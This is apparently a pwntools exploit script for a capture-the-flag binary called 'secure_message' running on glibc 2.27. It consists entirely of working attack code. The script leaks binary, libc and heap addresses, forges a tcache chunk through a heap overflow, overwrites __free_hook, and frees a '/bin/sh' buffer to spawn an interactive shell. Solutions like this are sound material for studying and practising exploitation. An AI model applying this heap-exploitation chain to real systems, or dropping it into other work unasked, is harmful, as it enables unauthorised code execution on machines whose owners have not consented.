from pwn import *

elf = ELF('./secure_message')
p = process(elf.path, env={'LD_PRELOAD': '/home/nathan/glibc/2-27/build/libc.so'})
print proc.pidof(p)[0]

def register(name, passwd, desc):
    p.sendlineafter('Choice: ', '1')
    p.sendafter('Username:', name)
    p.sendafter('Password:', passwd)
    p.sendafter('Describe your self', desc)

def login(name, passwd):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('Username:', name)
    p.sendlineafter('Password:', passwd)

def add(name, size, content):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('Name: ', name)
    p.sendlineafter('Size:', str(size))
    p.send(content)

def edit(num, size, content):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('edit?', str(num))
    p.sendlineafter('Size:', str(size))
    p.send(content)

def remove(num):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('?', str(num))

#overwrite the fd
register('a\n', 'a\n','a\n')
register('b'*0x20,'b'*0x20,'b\n')
register('c'*0x20,'c'*0x20,'c\n')
register('d'*0x20,'d'*0x20,'d\n')
login('a', 'a')

#leak address
add('y'*0x18, 0x1000, 'y\n')
p.send(p64(0xdeaddead000))
p.send(p64(0xdeaddead000))
p.send(p64(0))

add('', 0x100, '\n')
p.send(p64(0xdeaddeae000))
p.send(p64(0xdeaddeae000))
p.send(p64(0)*4)

p.sendlineafter('Choice: ', '4')
p.recvuntil('1 - [yyyyyyyyyyyyyyyyyyyyyyyy')
bin_base = u64(p.recv(6)+'\x00\x00') - 0x211d
p.recvuntil('\n')
libc_base = u64(p.recv(14).decode('hex')+'\x00') - 0x3ec2b0
p.recv(14)
heap_base = u64(p.recv(14).decode('hex')+'\x00') - 0x250

#make fake tcache 
edit(0, -1, 'a\n')
payload = 'd'*0xfd0 + p32(0x100) + p32(1) + p64(0xdeaddeaf040)
add('c', 0x1100, payload+'\n')
p.send(p64(0xdeaddead000))
p.send(p64(0xdeaddead000))
p.send(p64(0)*4)

payload = p64(0) + p64(0x31)
payload += p64(0) * 5
payload += p64(0x31)
edit(5, 0x100, payload+'\n')

remove(0)

#overwrite free_hook
payload = p64(0) + p64(0x31)
payload += p64(libc_base + 0x3ed8e8)+p64(0) * 4
payload += p64(0x31)
edit(5, 0x100, payload+'\n')

add('a', 0xf00, 'a\n')
p.send(p64(0xbeefdead000))
p.send(p64(0xbeefdead000))
p.send(p64(0)*4)

add('a', 0xf00, '/bin/sh\x00\n')
p.send(p64(0xbeefdead000))
p.send(p64(0xbeefdead000))
p.send(p64(libc_base+0x4f440))

p.interactive()

